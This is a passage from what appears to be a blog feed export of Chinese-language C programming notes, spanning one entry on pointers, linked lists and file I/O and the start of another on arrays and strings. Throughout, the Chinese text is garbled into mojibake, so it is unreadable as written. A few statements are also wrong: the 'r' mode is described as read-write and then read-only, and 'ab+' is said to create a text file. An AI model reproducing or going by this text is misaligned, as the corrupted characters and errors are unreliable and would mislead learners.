<h3 id="å…­ã€æŒ‡é’ˆä¸å‡½æ•°"><a href="#å…­ã€æŒ‡é’ˆä¸å‡½æ•°" class="headerlink" title="å…­ã€æŒ‡é’ˆä¸å‡½æ•°"></a>å…­ã€æŒ‡é’ˆä¸å‡½æ•°</h3><p>1ã€æŒ‡é’ˆå‡½æ•°ï¼šè¿”å›æŒ‡é’ˆç±»å‹çš„å‡½æ•° æ ¼å¼ï¼š**æ•°æ®ç±»å‹ *å‡½æ•°å(å½¢å‚è¡¨)*<em>ï¼ˆè°ƒç”¨å‡½æ•°æ—¶ï¼Œ</em>ä¸ç”¨å†™è¿›å»ï¼Œè·Ÿä¹‹å‰çš„å‡½æ•°è°ƒç”¨ä¸€è‡´ï¼Œåªå†™å‡½æ•°åï¼ˆå½¢å‚è¡¨ï¼‰å³å¯ï¼Œå½“ç„¶éœ€è¦å£°æ˜çš„æƒ…å†µä¹Ÿåˆ«å¿˜äº†ï¼‰</p>
<p>2ã€æŒ‡é’ˆå‡½æ•°ä¸­çš„returnè¿”å›çš„å€¼æ˜¯å˜é‡çš„åœ°å€ã€æ•°ç»„å…ƒç´ çš„é¦–åœ°å€ã€æŒ‡é’ˆå˜é‡ã€ç»“æ„ä½“ã€å…±ç”¨ä½“ç­‰çš„é¦–åœ°å€</p>
<p>3ã€æ¥è§¦åˆ°ä¸€ä¸ªæ–°çš„ç±»å‹æ ‡è¯†ç¬¦<strong>bool</strong>ï¼Œå®šä¹‰ä¹‹åï¼Œå˜é‡åªèƒ½è¢«èµ‹å€¼trueæˆ–è€…false</p>
<p>4ã€<strong>æŒ‡é’ˆå˜é‡</strong>ä½œä¸ºå‡½æ•°çš„<strong>å½¢å‚</strong>æ—¶ï¼Œé‚£ä¹ˆè°ƒç”¨å‡½æ•°æ—¶ï¼Œåœ†æ‹¬å·ä¹Ÿåº”æ˜¯<strong>æŸå˜é‡çš„åœ°å€</strong>ï¼Œä¿æŒç±»å‹ä¸€è‡´</p>
<p>å½“ä½¿ç”¨*æŒ‡é’ˆè¿ç®—ç¬¦å¯¹å½¢å‚è¿›è¡Œè¿ç®—å°±å¯ä»¥æ”¹å˜å®å‚çš„å€¼ </p>
<p>5ã€ä¸»å‡½æ•°main()çš„å½¢å‚ï¼šå¸¦å½¢å‚çš„ä¸»å‡½æ•°é¦–éƒ¨å½¢å¼ä¸º*<em>int main(int argc,char <em>argv[])</em></em></p>
<p>æ•´å‹argcä»£è¡¨å‘½ä»¤è¡Œæ€»çš„å‚æ•°ä¸ªæ•°(åŒ…æ‹¬ç¨‹åºå)ï¼ŒæŒ‡é’ˆæ•°ç»„argvä¸­æ¯ä¸ªå…ƒç´ æŒ‡å‘å‘½ä»¤è¡Œå¯¹åº”çš„å‚æ•°å­—ç¬¦ä¸²ï¼Œå‡è®¾æœ‰ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆargv[0]ä»£è¡¨è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>6ã€å‡½æ•°åæ˜¯å‡½æ•°çš„é¦–åœ°å€ï¼Œæ˜¯ä¸€ä¸ªåœ°å€å¸¸é‡ï¼Œä¸å¯è¢«æ”¹å˜</p>
<p>7ã€å‡½æ•°æŒ‡é’ˆï¼šæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ï¼Œé€šè¿‡æŒ‡å‘å‡½æ•°çš„é¦–åœ°å€ï¼Œä»è€Œè°ƒç”¨å‡½æ•°</p>
<p>æ ¼å¼ï¼š*<em>æ•°æ®ç±»å‹  (<em>å‡½æ•°æŒ‡é’ˆå˜é‡å)(å½¢å‚è¡¨)</em></em></p>
<p>æ³¨ï¼šå‡½æ•°æŒ‡é’ˆä¸æŒ‡é’ˆå‡½æ•°å·®åœ¨ä¸€ä¸ªåœ†æ‹¬å·ä¸Šï¼Œéœ€æ³¨æ„ï¼</p>
<p>8ã€å®šä¹‰çš„å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥æŒ‡å‘<strong>ä¸€ç±»</strong>çš„å‡½æ•°ï¼Œåªè¦<strong>æ•°æ®ç±»å‹å’Œå½¢å‚è¡¨ä¸­çš„å½¢å‚ç±»å‹ç›¸åŒï¼ˆä¸è¦æ±‚å½¢å‚å˜é‡ç›¸åŒï¼‰</strong>ã€‚å°±å¯ç”¨å¦‚p=funç»™å‡½æ•°æŒ‡é’ˆèµ‹å€¼ï¼Œæ­¤æ—¶ï¼Œp(å½¢å‚)ç­‰ä»·äºfun(å½¢å‚)</p>
<p>9ã€<strong>å‡½æ•°æŒ‡é’ˆä¸»è¦ç”¨äºå‡½æ•°ä¹‹é—´çš„ä¼ é€’å‡½æ•°ï¼Œå³ä¸»è°ƒå‡½æ•°ä¸­ç”¨å…¶ä»–çš„å‡½æ•°åä½œä¸ºå®å‚ï¼Œè¢«è°ƒå‡½æ•°ä¸­å‡½æ•°æŒ‡é’ˆä½œä¸ºå½¢å‚ï¼Œè¿™æ ·æŠŠå‡½æ•°çš„å…¥å£åœ°å€ä¼ ç»™å½¢å‚ï¼Œä»è€Œåœ¨è¢«è°ƒå‡½æ•°ä¸­ä½¿ç”¨ä¼ å…¥çš„å‡½æ•°</strong></p>
<h3 id="ä¸ƒã€é“¾è¡¨ï¼ˆå•å‘é“¾è¡¨ï¼‰"><a href="#ä¸ƒã€é“¾è¡¨ï¼ˆå•å‘é“¾è¡¨ï¼‰" class="headerlink" title="ä¸ƒã€é“¾è¡¨ï¼ˆå•å‘é“¾è¡¨ï¼‰"></a>ä¸ƒã€é“¾è¡¨ï¼ˆå•å‘é“¾è¡¨ï¼‰</h3><p>1ã€ç»“ç‚¹ï¼šé™¤äº†å­˜å‚¨æ•°æ®ï¼Œè¿˜å­˜å‚¨è¯¥æ•°æ®çš„åç»§ç»“æ„ä½“çš„åœ°å€çš„ç»“æ„ä½“</p>
<p>é“¾è¡¨ï¼šå­˜å‚¨ç€nä¸ªæ•°æ®çš„ç»“ç‚¹é€šè¿‡nextæŒ‡é’ˆè¿æ¥ä¸‹ä¸€ä¸ªç»“ç‚¹è€Œæ‹‰æˆä¸€æ¡ç±»ä¼¼é“¾å­çš„æ•°æ®é›†åˆ</p>
<p>2ã€ç”¨æŒ‡é’ˆå‡½æ•°è¿›è¡Œå»ºç«‹å•å‘é“¾è¡¨ï¼šä½¿ç”¨*<em>struct ç»“æ„ä½“å˜é‡å <em>p;p=new ç»“æ„ä½“å˜é‡å</em></em> å¼€è¾ŸåŠ¨æ€å­˜å‚¨ç©ºé—´ï¼Œåˆ›å»ºçš„ç¬¬ä¸€ä¸ªç©ºé—´å³ä¸ºå¤´ç»“ç‚¹ã€‚å¤´ç»“ç‚¹çš„åœ°å€åº”è¯¥å­˜æ”¾åœ¨ä¸¤ä¸ªæŒ‡é’ˆé‡Œé¢ï¼Œä¸€ä¸ªç”¨æ¥æœ€åçš„è¿”å›å¤´ç»“ç‚¹åœ°å€ï¼Œå¦ä¸€ä¸ªç”¨æ¥è¿›è¡Œåˆ›å»ºé“¾è¡¨ï¼Œå°¾ç»“ç‚¹è¦ç”¨NULLè¿›è¡Œç½®ç©ºã€‚</p>
<p>3ã€å•å‘é“¾è¡¨ç»“ç‚¹çš„æ’å…¥ï¼šï¼ˆ1ï¼‰s-&gt;next=p-&gt;next;   (2)p-&gt;next=s; ï¼ˆsï¼Œpå‡ä¸ºæŒ‡å‘ç»“æ„ä½“çš„æŒ‡é’ˆï¼‰</p>
<p>4ã€å•å‘é“¾è¡¨ç»“ç‚¹çš„åˆ é™¤ï¼šï¼ˆ1ï¼‰p-&gt;next=q-&gt;next; (2)delete q;   ï¼ˆpï¼Œqå‡ä¸ºæŒ‡å‘ç»“æ„ä½“çš„æŒ‡é’ˆï¼‰</p>
<h1 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h1><h3 id="ä¸€ã€æ–‡ä»¶æ¦‚å¿µ"><a href="#ä¸€ã€æ–‡ä»¶æ¦‚å¿µ" class="headerlink" title="ä¸€ã€æ–‡ä»¶æ¦‚å¿µ"></a>ä¸€ã€æ–‡ä»¶æ¦‚å¿µ</h3><p>1ã€æ–‡ä»¶ï¼šå‚¨å­˜åœ¨å¤–éƒ¨å­˜å‚¨ä»‹è´¨ä¸Šçš„æ•°æ®é›†åˆ</p>
<p>æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªåå­—ï¼Œç§°ä¸ºæ–‡ä»¶åï¼Œå¯¹äºæ–‡ä»¶çš„å­˜å–éƒ½æ˜¯æŒ‰ç…§åå­—è¿›è¡Œçš„</p>
<p>2ã€ASCâ… â… æ–‡ä»¶ï¼šç”±è®¸å¤šçš„å­—ç¬¦ç»„æˆçš„</p>
<p>äºŒè¿›åˆ¶æ–‡ä»¶ï¼šä»…å°†å­—èŠ‚ä¸­çš„äºŒè¿›åˆ¶æŒ‰ç…§åŸæ ·è¾“å‡º</p>
<h3 id="äºŒã€æ–‡ä»¶æŒ‡é’ˆ"><a href="#äºŒã€æ–‡ä»¶æŒ‡é’ˆ" class="headerlink" title="äºŒã€æ–‡ä»¶æŒ‡é’ˆ"></a>äºŒã€æ–‡ä»¶æŒ‡é’ˆ</h3><p>1ã€ç¼“å†²æ–‡ä»¶ç³»ç»Ÿä¼šä¸ºæ¯ä¸ªæ–‡ä»¶å¼€è¾Ÿä¸€ç‰‡åŒºåŸŸï¼Œç”¨äºå­˜æ”¾æ–‡ä»¶çš„ä¿¡æ¯ã€‚å­˜å‚¨å½¢å¼é‡‡ç”¨ç»“æ„ä½“ç±»å‹çš„å˜é‡ï¼Œè¯¥å˜é‡åå­—ä¸ºFILEï¼ˆæ³¨æ„æ˜¯<strong>å¤§å†™</strong>ï¼‰</p>
<p>2ã€æ‰€ä»¥æ–‡ä»¶æŒ‡é’ˆå®šä¹‰ä¸º*<em>FILE <em>fp;</em></em> </p>
<h3 id="ä¸‰ã€æ–‡ä»¶çš„æ‰“å¼€å’Œå…³é—­"><a href="#ä¸‰ã€æ–‡ä»¶çš„æ‰“å¼€å’Œå…³é—­" class="headerlink" title="ä¸‰ã€æ–‡ä»¶çš„æ‰“å¼€å’Œå…³é—­"></a>ä¸‰ã€æ–‡ä»¶çš„æ‰“å¼€å’Œå…³é—­</h3><p>1ã€æ–‡ä»¶æ‰“å¼€å‡½æ•°ä¸º<strong>fopen()</strong></p>
<p>æ ¼å¼ä¸ºï¼š<strong>fp=fopen(æ–‡ä»¶å,æ–‡ä»¶æ‰“å¼€æ–¹å¼);</strong> ï¼ˆfpæ˜¯æ–‡ä»¶æŒ‡é’ˆï¼Œæ–‡ä»¶åï¼šè¦æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶å…¨åï¼ˆæ–‡ä»¶å.æ‹“å±•åï¼‰ï¼‰<strong>æ³¨ï¼šæ–‡ä»¶åä¸æ–‡ä»¶æ‰“å¼€æ–¹å¼è¦åœ¨â€â€é‡Œé¢</strong>   (è¿˜æœ‰ï¼Œä¸€èˆ¬è¿˜è¦æ£€éªŒæ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ï¼Œç”¨fpæ˜¯å¦ç­‰äºNULLè¿›è¡Œåˆ¤åˆ«)</p>
<table>
<thead>
<tr>
<th align="left">æ–‡ä»¶æ‰“å¼€æ–¹å¼</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="left">ræˆ–rt</td>
<td>ä»¥è¯»å†™çš„æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œåªèƒ½è¯»</td>
</tr>
<tr>
<td align="left">wæˆ–wt</td>
<td>ä»¥åªå†™çš„æ–¹å¼å»ºç«‹å¹¶æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ—¶æ¸…ç©ºåŸå†…å®¹ï¼Œåªå…è®¸å†™</td>
</tr>
<tr>
<td align="left">aæˆ–at</td>
<td>ä»¥è¿½åŠ çš„æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å°†å†™å…¥çš„å†…å®¹æ·»åŠ åˆ°æ–‡ä»¶çš„æœ«å°¾ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td align="left">rb</td>
<td>ä»¥åªè¯»çš„æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œåªå…è®¸è¯»</td>
</tr>
<tr>
<td align="left">wb</td>
<td>ä»¥åªå†™æ–¹å¼å»ºç«‹å¹¶æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ—¶æ¸…ç©ºåŸå†…å®¹ï¼Œåªå…è®¸å†™</td>
</tr>
<tr>
<td align="left">ab</td>
<td>ä»¥è¿½åŠ æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</td>
</tr>
<tr>
<td align="left">r+æˆ–rt+</td>
<td>ä»¥è¯»/å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æ­¤æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå…è®¸è¯»å’Œå†™</td>
</tr>
<tr>
<td align="left">w+æˆ–wt+</td>
<td>ä»¥è¯»/å†™æ–¹å¼å»ºç«‹å¹¶æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ—¶æ¸…ç©ºåŸå†…å®¹ï¼Œå…è®¸è¯»å’Œå†™</td>
</tr>
<tr>
<td align="left">a+æˆ–at+</td>
<td>ä»¥è¯»/è¿½åŠ å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</td>
</tr>
<tr>
<td align="left">rb+</td>
<td>ä»¥è¯»/å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå…è®¸è¯»å’Œå†™</td>
</tr>
<tr>
<td align="left">wb+</td>
<td>ä»¥è¯»/å†™æ–¹å¼å»ºç«‹å¹¶æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ—¶æ¸…ç©ºåŸå†…å®¹ï¼Œå…è®¸è¯»å’Œå†™</td>
</tr>
<tr>
<td align="left">ab+</td>
<td>ä»¥è¯»/è¿½åŠ å†™æ–¹å¼æ‰“å¼€ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</td>
</tr>
</tbody></table>
<p>2ã€å¦‚æœæ–‡ä»¶æ‰“å¼€ä¸æˆåŠŸï¼Œå°†è¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆå€¼NULLï¼Œå¯ä»¥æ®æ­¤åˆ¤æ–­æ˜¯å¦æˆåŠŸæ‰“å¼€æ–‡ä»¶ã€‚</p>
<p>3ã€ç¼“å†²æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶ä½¿ç”¨å®Œæ¯•è¦åŠæ—¶å…³é—­ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æ–‡ä»¶ä¿¡æ¯ä¸¢å¤±ï¼Œæˆ–è€…è¢«è¯¯æ“ä½œè€ŒæŸå</p>
<p>4ã€æ–‡ä»¶å…³é—­å‡½æ•°<strong>fclose()</strong></p>
<p>æ ¼å¼ä¸ºï¼š<strong>fclose(æ–‡ä»¶æŒ‡é’ˆ)</strong> ï¼ˆæ­£å¸¸å…³é—­å‡½æ•°ï¼Œfcloseè¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´æ•°0ï¼Œå¦åˆ™è¿”å›EOFå³-1ï¼‰</p>
<h3 id="å››ã€æ–‡ä»¶çš„è¯»å–å’Œå†™å…¥"><a href="#å››ã€æ–‡ä»¶çš„è¯»å–å’Œå†™å…¥" class="headerlink" title="å››ã€æ–‡ä»¶çš„è¯»å–å’Œå†™å…¥"></a>å››ã€æ–‡ä»¶çš„è¯»å–å’Œå†™å…¥</h3><p>1ã€<strong>fputc(ch,fp)</strong>; å‘ä¸€ä¸ªå…è®¸å†™æˆ–è€…è¯»å†™æ–¹å¼æ‰“å¼€çš„æ–‡ä»¶å†™å…¥ä¸€ä¸ªå­—ç¬¦ï¼ˆchè¡¨ç¤ºä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„å­—ç¬¦ï¼Œfpè¡¨ç¤ºæ–‡ä»¶æŒ‡é’ˆï¼‰ï¼ˆè¾“å‡ºæˆåŠŸè¿”å›å­—ç¬¦çš„ASCIIå€¼ï¼Œå¤±è´¥åˆ™è¿”å›EOFå³-1ï¼‰</p>
<p>2ã€<strong>ch=fgetc(fp);</strong> ä»ä¸€ä¸ªå…è®¸è¯»æˆ–è€…è¯»å†™æ–¹å¼æ‰“å¼€çš„æ–‡ä»¶è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼ˆå½“è¯»çš„æ˜¯æ–‡æœ¬æ–‡ä»¶æ—¶ï¼Œè¯»å–åˆ°æœ«å°¾æ—¶è¿”å›EOFï¼Œå³-1ï¼‰</p>
<p>3ã€<strong>feof(fp);</strong> åˆ¤æ–­ä¸€ä¸ªæ–‡ä»¶æ˜¯å¦åˆ°æ–‡ä»¶çš„æœ«å°¾ï¼Œåˆ°æœ«å°¾åˆ™è¿”å›1ï¼Œæ²¡åˆ°æœ«å°¾åˆ™è¿”å›0ï¼ˆå¯ç”¨äºå¾ªç¯è¯­å¥çš„åˆ¤æ–­æ¡ä»¶ï¼‰</p>
<p>ä»¥ä¸Šå‡½æ•°è™½æ˜¯ä¸€ä¸ªä¸ªçš„è¯»å–ï¼Œä½†æ˜¯å¯ç”¨å¾ªç¯è¯­å¥ï¼ˆwhile () å¾ˆé€‚åˆï¼‰è¿›è¡Œé‡å¤è¯»å–æˆ–å†™å…¥</p>
<h3 id="äº”ã€æ–‡ä»¶çš„å®šä½å‡½æ•°"><a href="#äº”ã€æ–‡ä»¶çš„å®šä½å‡½æ•°" class="headerlink" title="äº”ã€æ–‡ä»¶çš„å®šä½å‡½æ•°"></a>äº”ã€æ–‡ä»¶çš„å®šä½å‡½æ•°</h3>]]></content>
  </entry>
  <entry>
    <title>cè¯­è¨€â€”â€”æ„é€ æ•°æ®ç±»å‹ä¸å‡½æ•°ç¬”è®°</title>
    <url>/2020/10/22/2020-10-22-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="æ„é€ æ•°æ®ç±»å‹"><a href="#æ„é€ æ•°æ®ç±»å‹" class="headerlink" title="æ„é€ æ•°æ®ç±»å‹"></a>æ„é€ æ•°æ®ç±»å‹</h1><h3 id="ä¸€ã€æ•°ç»„"><a href="#ä¸€ã€æ•°ç»„" class="headerlink" title="ä¸€ã€æ•°ç»„"></a>ä¸€ã€æ•°ç»„</h3><p>1ã€æ•°ç»„ï¼šä¸€æ‰¹ç±»å‹æ€§è´¨ç›¸åŒçš„æ•°æ®çš„é›†åˆ</p>
<p>2ã€æ•°ç»„å®šä¹‰ä¸ä¹‹å‰çš„å˜é‡å¹¶æ— å¤ªå¤§å·®å¼‚ï¼Œåªæ˜¯åœ¨å…¶åé¢å¤šäº†ç»´æ•°ï¼Œä»¥åŠç»„ä¸­çš„ä¸ªæ•°ã€‚ä¸€ç»´åˆ™[]ä¸­çš„æ•°å­—è¡¨ç¤ºä¸ºæ•°ç»„å…ƒç´ çš„æ€»æ•°ï¼Œè‹¥äºŒç»´åˆ™[] []è¡¨ç¤ºå‡ è¡Œå‡ åˆ—ï¼ˆå…ˆè¡Œååˆ—ï¼‰çš„æ•°æ®</p>
<p>3ã€æ•°ç»„åä¸ä¸å˜é‡åé‡å¤ï¼Œä¸€æ ·ä¹Ÿä¸å¯ä»¥å–ç”¨å…³é”®è¯ä½œä¸ºç»„åï¼Œå®šä¹‰æ•°ç»„å…ƒç´ çš„ä¸ªæ•°ï¼ˆç§°ä¸ºæ•°ç»„é•¿åº¦æˆ–æ•°ç»„å¤§å°ï¼‰ä¸èƒ½å«æœ‰å˜é‡ï¼Œå®šä¹‰ä¸ºå¸¸é‡çš„å¯ä»¥ï¼ˆé‡Œé¢è¿›è¡ŒåŠ å‡ä¹˜é™¤ä¹Ÿå¯ï¼Œæœ‰å…·ä½“æ•´æ•°å€¼éƒ½å¯ï¼‰</p>
<p><strong>æ³¨ï¼šä¸èƒ½ç›´æ¥å¼•ç”¨æ•´ä¸ªæ•°ç»„ï¼Œåªèƒ½ä½¿ç”¨æ•°ç»„ä¸­çš„æŸä¸ªæ•°æ®ï¼ˆå­—ç¬¦ä¸²æ•°ç»„é™¤å¤–ï¼‰</strong></p>
<p>4ã€æ•°ç»„ä¸‹æ ‡ä»0å¼€å§‹ï¼Œï¼ˆä¸€ç»´æ•°ç»„çš„æœ€åä¸€ä¸ªæ•°æ®ä¸ºæ•°ç»„é•¿åº¦å‡1ï¼Œä¾‹å¦‚Score[10]ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºScore[0]æœ€åä¸€ä¸ªå…ƒç´ ä¸ºScore[9]ï¼‰</p>
<p>5ã€æ•°ç»„çš„èµ‹å€¼æœ‰ä¸‰ç§:ï¼ˆ1ï¼‰ç”¨å¾ªç¯è¯­å¥è¿›è¡Œæœ‰è§„å¾‹çš„èµ‹å€¼ï¼ˆ2ï¼‰å¾ªç¯è¯­å¥ä¸­åˆ©ç”¨è¾“å…¥å‡½æ•°è¿›è¡Œé€ä¸ªè¾“å…¥ ï¼ˆ3ï¼‰åˆå§‹åŒ–ï¼Œåœ¨å®šä¹‰æ•°ç»„æ—¶ï¼Œç›´æ¥ç”¨èŠ±æ‹¬å·èµ‹æŒ‡ï¼Œï¼ˆæŒ‰ç…§é¡ºåºèµ‹å€¼ï¼Œå¦‚æœæ•°æ®æ•°é‡ä¸å¤Ÿï¼Œåˆ™åé¢çš„æ•°æ®ç›´æ¥èµ‹å€¼ä¸º0ï¼›å¦‚æœè¿‡å¤§ï¼Œå°†æŠ¥é”™ï¼‰</p>
<p>6ã€æ•°ç»„åä»£è¡¨çš„æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒåœ°å€ï¼Œæ‰€ä»¥è‹¥æ˜¯ç›´æ¥ä½¿ç”¨æ•°ç»„åè¿›è¡Œè¾“å…¥å‡½æ•°å–å€¼ï¼Œå°±æ— éœ€ä½¿ç”¨&amp;ï¼ˆåº”ç”¨åœ¨å­—ç¬¦æ•°ç»„ä¸Šï¼‰</p>
<p>7ã€å¯¹äºæ•°ç»„æ’åºçš„å†’æ³¡æ’åºå’Œé€‰æ‹©æ’åºï¼Œé‡ç‚¹åœ¨äºå†…å±‚å¾ªç¯å˜é‡çš„å–å€¼èŒƒå›´å˜åŒ–ï¼Œæ˜¯æœç€å°å˜åŒ–æˆ–æ˜¯æœç€å¤§å˜åŒ–ï¼Œå†³å®šäº†æ•°ç»„æ’åºçš„æ˜¯ä»å°åˆ°å¤§è¿˜æ˜¯ä»å¤§åˆ°å°ï¼›è€Œå†…å±‚å¾ªç¯å˜é‡çš„å–å€¼èŒƒå›´åº”è¯¥è¶Šæ¥è¶Šå°ï¼Œå› ä¸ºå·²ç»æ’åºçš„åº”è¯¥å°†ä¹‹æ’é™¤åœ¨å¤–</p>
<p>8ã€äºŒç»´æ•°ç»„ï¼šä¾‹å¦‚a[x] [y] ï¼ˆä¸¤ä¸ª[]ä¸èƒ½ç®€å†™æˆ[x,y]ï¼Œæ˜¯é”™è¯¯è¯­æ³•ï¼‰ä»£è¡¨æ•°ç»„aç”±xè¡Œyåˆ—ç»„æˆï¼Œä¸€å…±x*yä¸ªå…ƒç´ ï¼›è¡¨ç¤ºçš„æœ€å¤§ä¸‹æ ‡x-1ï¼Œy-1</p>
<p>9ã€äºŒç»´æ•°ç»„çš„å­˜æ”¾é¡ºåºæ˜¯ä¸€è¡Œä¸€è¡Œçš„å¡«å……ï¼Œæ¯”å¦‚å…ˆå¡«æ»¡ç¬¬0è¡Œï¼Œæ‰ä¼šå¼€å§‹å¡«ç¬¬ä¸€è¡Œ</p>
<p>10ã€äºŒç»´æ•°ç»„çš„èµ‹å€¼ï¼š</p>
<p>ï¼ˆ1ï¼‰ç›´æ¥åœ¨åé¢è·Ÿ=ï½›ï½ï¼Œé‡Œé¢å¯ä»¥ç›´æ¥å¡«å†™æ•°å­—ç›´åˆ°æ»¡ï¼ˆä¸å»ºè®®ï¼Œååˆ†ä¸æ¸…æ™°ï¼‰æˆ–æ˜¯æ¯ä¸€è¡Œç”¨ï½›ï½æ‹¬èµ·æ¥ï¼Œä¼šæ¸…æ™°æ˜äº†è®¸å¤šï¼Œå„ä¸ªï½›ï½é—´ç”¨â€œï¼Œâ€éš”å¼€ï¼ˆå¦‚æœä¸€æ¬¡æ€§å†™æ»¡ï¼Œåˆ™å¯ä»¥çœç•¥è¡Œé‡Œé¢çš„æ•°å­—ï¼Œåˆ—ä¸è¡Œ</p>
<p>ï¼ˆ2ï¼‰å¦‚æœæ˜¯æ¯è¡Œé€šè¿‡ï½›ï½éš”å¼€çš„æƒ…å†µï¼Œåˆ™å¯ä»¥åªå¡«å†™è¯¥è¡Œå‰å‡ åˆ—çš„æ•°æ®ï¼Œå…¶ä»–çš„å°†ä¼šè¢«ç³»ç»Ÿå¡«0</p>
<p>  11ã€cè¯­è¨€ä¸­æ²¡æœ‰å®šä¹‰å­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨æ•°ç»„æ¥å¤„ç†å­—ç¬¦ä¸²ï¼Œå®šä¹‰æ–¹å¼ä¸ä¹‹å‰çš„æ•°ç»„å¹¶æ— å¤ªå¤§åŒºåˆ«ï¼Œåªéœ€æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<p>ï¼ˆ1ï¼‰å¦‚æœåœ¨åˆå§‹åŒ–å®šä¹‰æ—¶ï¼Œç”¨å•ä¸ªå­—ç¬¦å®šä¹‰ï¼Œåˆ™æ¯ä¸ªå­—ç¬¦éœ€ä½¿ç”¨ â€˜  â€˜ æ‹¬èµ·æ¥ï¼Œä½†æ˜¯æ²¡æœ‰èµ‹å€¼çš„å°†è¢«ç³»ç»Ÿå¡«å……â€™\0â€™ï¼›æ•…æ­¤ï¼Œä¸ä¹‹å‰æ•°ç»„ä¸€è‡´ï¼Œå¦‚æœè¦å°†æ‰€æœ‰æ•°ç»„éƒ½å˜ä¸º0ï¼›åˆ™è¾“å…¥â€™\0â€™å³å¯</p>
<p>ï¼ˆ2ï¼‰åˆå§‹åŒ–æ—¶å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²èµ‹å€¼ï¼Œå­—ç¬¦ä¸²ä½¿ç”¨â€  â€œæ‹¬èµ·æ¥ï¼Œä¹‹åç³»ç»Ÿå°†ä¼šè‡ªåŠ¨è¡¥å……â€™\0â€™ï¼ˆåªæœ‰ç»“å°¾æ˜¯ç©ºå­—ç¬¦çš„å­—ç¬¦æ•°ç»„å¯ä»¥ç”¨%sç›´æ¥è¾“å‡ºï¼‰ï¼Œæ‰€ä»¥å¦‚æœç”¨å­—ç¬¦ä¸²èµ‹å€¼ï¼Œå­˜å‚¨çš„å­—èŠ‚æ•°å°†ä¼šæ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦åŠ 1ï¼ˆæ‰€ä»¥éœ€è¦æ³¨æ„æ•°ç»„é•¿åº¦æ˜¯å¦å¤Ÿå¤§ï¼‰</p>
